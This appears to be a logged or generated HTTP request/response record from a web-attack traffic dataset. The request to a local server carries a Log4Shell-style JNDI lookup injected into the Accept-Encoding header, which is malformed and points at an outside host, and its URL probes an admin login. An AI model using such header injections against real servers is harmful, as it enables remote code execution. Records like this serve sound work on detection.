@@ -1,0 +1,34 @@
+{
+  "request": {
+    "body": "",
+    "headers": {
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br${jndi:ldapsnolabor.org/MeetingMinutes/SCLCminutes9-22-04.htm}",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Connection": "keep-alive",
+      "Content-Length": null,
+      "Cookie": null,
+      "Date": "Mon, 21 Nov 2022 18:16:51 GMT",
+      "Host": "127.0.0.1:5000",
+      "Sec-Fetch-Dest": "document",
+      "Sec-Fetch-Mode": "same-origin",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-User": "?1",
+      "Set-Cookie": "['ck=71QH4CtiJ6gxM9iNjHZKyxejajS-uk9Uz1HnqncW9Ae3N0yGMoqy515jBVdIc8vFzoTm4Hj4aA2cajdLIlPCUQ; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:16:51 GMT', 'uu=gYwNACnfkesbFXU-UgauvIo977HIX5Csopf9iveop0B-bK77IPxJRoUEP2SUDwvkIb4DUt_Jeu11ymdDjZstZg; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:16:51 GMT', 'session=374cd82f-944c-410a-8f05-b8fc667dad1a; Expires=Mon, 21 Nov 2022 18:46:51 GMT']",
+      "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+    },
+    "method": "GET",
+    "url": "http://127.0.0.1:5000/login/admin/password/7588"
+  },
+  "response": {
+    "body": "{\"error\": \"Access denied\"}",
+    "headers": {
+      "Content-Length": "31",
+      "Content-Type": "application/json",
+      "Location": null,
+      "Set-Cookie": null
+    },
+    "status": "401 UNAUTHORIZED",
+    "status_code": 401
+  }
+}
